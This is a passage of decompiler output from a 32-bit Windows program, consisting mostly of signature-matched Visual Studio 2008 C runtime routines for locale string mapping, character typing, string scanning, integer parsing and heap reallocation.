    sVar2 = HeapSize(DAT_00423e54,0,_Memory);
  }
  return sVar2;
}



void FUN_00415842(void)

{
  FUN_0040e2eb(4);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  uint cchWideChar;
  undefined4 *puVar6;
  UINT UVar7;
  int *in_ECX;
  char *pcVar8;
  LPSTR lpMultiByteStr;
  void *local_14;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (DAT_00424450 == 0) {
    iVar3 = LCMapStringW(0,0x100,(LPCWSTR)&DAT_0041cbd0,1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x78) {
        DAT_00424450 = 2;
      }
    }
    else {
      DAT_00424450 = 1;
    }
  }
  pcVar5 = (char *)param_3;
  pcVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pcVar8 = pcVar8 + -1;
      if (*pcVar5 == '\0') goto LAB_004158bc;
      pcVar5 = pcVar5 + 1;
    } while (pcVar8 != (char *)0x0);
    pcVar8 = (char *)0xffffffff;
LAB_004158bc:
    pcVar5 = param_4 + -(int)pcVar8;
    bVar2 = (int)(pcVar5 + -1) < (int)param_4;
    param_4 = pcVar5 + -1;
    if (bVar2) {
      param_4 = pcVar5;
    }
  }
  if ((DAT_00424450 == 2) || (DAT_00424450 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (void *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_7 == 0) {
      param_7 = *(int *)(*in_ECX + 4);
    }
    UVar7 = ___ansicp((LCID)param_1);
    if (UVar7 == 0xffffffff) goto LAB_00415bde;
    if (UVar7 == param_7) {
      LCMapStringA((LCID)param_1,param_2,(LPCSTR)param_3,(int)param_4,(LPSTR)param_5,(int)param_6);
    }
    else {
      local_10 = (undefined4 *)
                 ___convertcp(param_7,UVar7,(char *)param_3,(uint *)&param_4,(LPSTR)0x0,0);
      if (local_10 == (undefined4 *)0x0) goto LAB_00415bde;
      local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)0x0,0);
      if (local_c != 0) {
        if (((int)local_c < 1) || (0xffffffe0 < local_c)) {
          puVar6 = (undefined4 *)0x0;
        }
        else if (local_c + 8 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00415bbb;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(local_c + 8);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
        if (puVar6 != (undefined4 *)0x0) {
          _memset(puVar6,0,local_c);
          local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)puVar6,
                                 local_c);
          if (local_c != 0) {
            local_14 = (void *)___convertcp(UVar7,param_7,(char *)puVar6,&local_c,(LPSTR)param_5,
                                            (int)param_6);
          }
          __freea(puVar6);
        }
      }
    }
LAB_00415bbb:
    if (local_10 != (undefined4 *)0x0) {
      _free(local_10);
    }
    if ((local_14 != (void *)0x0) && ((void *)param_5 != local_14)) {
      _free(local_14);
    }
    goto LAB_00415bde;
  }
  if (DAT_00424450 != 1) goto LAB_00415bde;
  local_c = 0;
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_8 != 0) * 8 + 1,(LPCSTR)param_3,
                                    (int)param_4,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00415bde;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_00415964:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar1);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_00415964;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_00415bde;
  iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)param_4,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != 0)) {
    if ((param_2 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0 / local_c < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        uVar1 = local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00415a74;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(uVar1);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,
                             local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = (LPSTR)param_5;
          pcVar5 = param_6;
          if (param_6 == (char *)0x0) {
            lpMultiByteStr = (LPSTR)0x0;
            pcVar5 = (char *)0x0;
          }
          local_c = WideCharToMultiByte(param_7,0,(LPCWSTR)puVar6,local_c,lpMultiByteStr,(int)pcVar5
                                        ,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_6 != (char *)0x0) && ((int)local_c <= (int)param_6)) {
      LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_5,(int)param_6)
      ;
    }
  }
LAB_00415a74:
  __freea(local_10);
LAB_00415bde:
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwMapFlag,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpDestStr,(char *)_CchDest,_Code_page,_BError,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  BOOL BVar1;
  DWORD DVar2;
  uint cchWideChar;
  undefined4 *puVar3;
  int iVar4;
  ushort *puVar5;
  int *in_ECX;
  undefined4 *lpWideCharStr;
  void *_Memory;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_c = in_ECX;
  if (DAT_00424454 == 0) {
    BVar1 = GetStringTypeW(1,(LPCWSTR)&DAT_0041cbd0,1,(LPWORD)&local_c);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_00424454 = 2;
      }
      goto LAB_00415c90;
    }
    DAT_00424454 = 1;
  }
  else {
LAB_00415c90:
    if ((DAT_00424454 == 2) || (DAT_00424454 == 0)) {
      _Memory = (void *)0x0;
      if (param_6 == 0) {
        param_6 = *(int *)(*in_ECX + 0x14);
      }
      if (param_5 == (ushort *)0x0) {
        param_5 = *(ushort **)(*in_ECX + 4);
      }
      puVar5 = (ushort *)___ansicp(param_6);
      if ((puVar5 != (ushort *)0xffffffff) &&
         (((puVar5 == param_5 ||
           (_Memory = (void *)___convertcp((UINT)param_5,(UINT)puVar5,(char *)param_2,
                                           (uint *)&param_3,(LPSTR)0x0,0), param_2 = (ulong)_Memory,
           _Memory != (void *)0x0)) &&
          (GetStringTypeA(param_6,(DWORD)param_1,(LPCSTR)param_2,(int)param_3,(LPWORD)param_4),
          _Memory != (void *)0x0)))) {
        _free(_Memory);
      }
      goto LAB_00415ddd;
    }
    if (DAT_00424454 != 1) goto LAB_00415ddd;
  }
  local_c = (int *)0x0;
  if (param_5 == (ushort *)0x0) {
    param_5 = *(ushort **)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar((UINT)param_5,(uint)(param_7 != 0) * 8 + 1,(LPCSTR)param_2,
                                    (int)param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00415ddd;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar3 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_00415d20:
        lpWideCharStr = puVar3 + 2;
      }
    }
    else {
      puVar3 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_00415d20;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar((UINT)param_5,1,(LPCSTR)param_2,(int)param_3,(LPWSTR)lpWideCharStr,
                                cchWideChar);
    if (iVar4 != 0) {
      local_c = (int *)GetStringTypeW((DWORD)param_1,(LPCWSTR)lpWideCharStr,iVar4,(LPWORD)param_4);
    }
    __freea(lpWideCharStr);
  }
LAB_00415ddd:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)_DWInfoType,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpCharType,(ushort *)_Code_page,_BError,in_stack_00000020,
                     in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_00422ed0) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_00422ed4) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_00422ed8) {
      _free(param_1[2]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_00422edc) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_00422ee0) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_00422ee4) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_00422ee8) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_00422eec) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_00422ef0) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_00422ef4) {
      _free(*(undefined **)(param_1 + 0x24));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  ___crtGetStringTypeW
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeW
          (localeinfo_struct *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWORD param_5)

{
  BOOL BVar1;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,param_1);
  if (param_4 < -1) {
    BVar1 = 0;
  }
  else {
    BVar1 = GetStringTypeW(param_2,param_3,param_4,param_5);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return BVar1;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_00416192:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_00416229;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_00416264:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_00416192;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_00416229:
          piVar2 = __errno();
          *piVar2 = 0x22;
          __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_00416264;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2008 Release

ulong __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ulong local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  ptVar5 = local_18.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,&local_18);
      ptVar5 = local_18.locinfo;
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_004163b0:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_004163b0;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_00416416;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_00416416;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_00416416;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_00416416:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_00416473:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((param_5 & 1U) == 0) {
            local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_00416473;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)(uint)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_00416473;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2008 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  undefined **ppuVar2;
  
  if (DAT_004241c8 == 0) {
    ppuVar2 = &PTR_DAT_00422d98;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = strtoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  int *piVar4;
  DWORD DVar5;
  LPVOID pvVar6;
  uint *local_24;
  int *local_20;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
    return (void *)0x0;
  }
  if (DAT_0042576c == 3) {
    do {
      local_20 = (int *)0x0;
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_0041672a;
      __lock(4);
      local_24 = (uint *)___sbh_find_block((int)_Memory);
      if (local_24 != (uint *)0x0) {
        if (_NewSize <= DAT_00425778) {
          iVar2 = ___sbh_resize_block(local_24,(int)_Memory,_NewSize);
          if (iVar2 == 0) {
            local_20 = ___sbh_alloc_block((uint *)_NewSize);
            if (local_20 != (int *)0x0) {
              puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
              if (_NewSize <= puVar3) {
                puVar3 = (uint *)_NewSize;
              }
              _memcpy(local_20,_Memory,(size_t)puVar3);
              local_24 = (uint *)___sbh_find_block((int)_Memory);
              ___sbh_free_block(local_24,(int)_Memory);
            }
          }
          else {
            local_20 = (int *)_Memory;
          }
        }
        if (local_20 == (int *)0x0) {
          if ((uint *)_NewSize == (uint *)0x0) {
            _NewSize = 1;
          }
          _NewSize = _NewSize + 0xf & 0xfffffff0;
          local_20 = (int *)HeapAlloc(DAT_00423e54,0,_NewSize);
          if (local_20 != (int *)0x0) {
            puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
            if (_NewSize <= puVar3) {
              puVar3 = (uint *)_NewSize;
            }
            _memcpy(local_20,_Memory,(size_t)puVar3);
            ___sbh_free_block(local_24,(int)_Memory);
          }
        }
      }
      FUN_00416695();
      if (local_24 == (uint *)0x0) {
        if ((uint *)_NewSize == (uint *)0x0) {
          _NewSize = 1;
        }
        _NewSize = _NewSize + 0xf & 0xfffffff0;
        local_20 = (int *)HeapReAlloc(DAT_00423e54,0,_Memory,_NewSize);
      }
      if (local_20 != (int *)0x0) {
        return local_20;
      }
      if (DAT_004241a8 == 0) {
        piVar4 = __errno();
        if (local_24 != (uint *)0x0) {
          *piVar4 = 0xc;
          return (void *)0x0;
        }
        goto LAB_00416757;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
    if (local_24 != (uint *)0x0) goto LAB_00416736;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_0041672a;
      if ((uint *)_NewSize == (uint *)0x0) {
        _NewSize = 1;
      }
      pvVar6 = HeapReAlloc(DAT_00423e54,0,_Memory,_NewSize);
      if (pvVar6 != (LPVOID)0x0) {
        return pvVar6;
      }
      if (DAT_004241a8 == 0) {
        piVar4 = __errno();
LAB_00416757:
        DVar5 = GetLastError();
        iVar2 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar2;
        return (void *)0x0;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
  }
  DVar5 = GetLastError();
  iVar2 = __get_errno_from_oserr(DVar5);
  *piVar4 = iVar2;
  return (void *)0x0;
LAB_0041672a:
  __callnewh(_NewSize);
  piVar4 = __errno();
LAB_00416736:
  *piVar4 = 0xc;
  return (void *)0x0;
}



void FUN_00416695(void)

{
  FUN_0040e2eb(4);
  return;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2008 Release

